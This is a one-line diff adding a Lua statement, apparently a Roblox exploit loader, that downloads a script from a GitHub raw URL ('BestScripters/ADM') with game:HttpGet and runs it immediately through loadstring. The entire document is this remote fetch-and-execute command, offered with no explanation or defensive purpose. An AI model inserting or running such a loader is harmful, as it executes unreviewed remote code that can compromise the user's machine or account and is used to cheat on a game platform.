@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BestScripters/ADM/refs/heads/main/ADM"))()
